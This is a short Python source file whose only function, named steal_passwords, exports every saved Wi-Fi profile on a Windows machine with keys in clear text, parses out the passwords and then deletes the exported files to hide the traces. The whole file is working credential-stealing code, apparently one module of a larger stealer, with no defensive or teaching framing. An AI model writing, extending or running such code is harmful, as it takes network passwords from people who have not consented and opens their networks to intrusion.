import os
import os.path
import shutil


def steal_passwords() -> str:
    path = ".\\WI-FI\\"
    command = f"netsh wlan export profile folder = {path} key=clear"
    command2 = 'Set-Service -Name "Wlansvc" -Status running'
    if not os.path.exists(path):
        os.makedirs(path)
    os.system(f'cmd /c "{command}"')
    os.system(f'powershell -Command "{command2}"')
    result = ""
    for filename in os.listdir(path):
        with open(path + filename, "r") as f:
            content = f.read()
            start = content.find("<keyMaterial>") + len("<keyMaterial>")
            end = content.find("</keyMaterial>")
            if end != -1 and start != -1:
                password = content[start:end]
                result += password + "\n"
    shutil.rmtree(path)
    return result
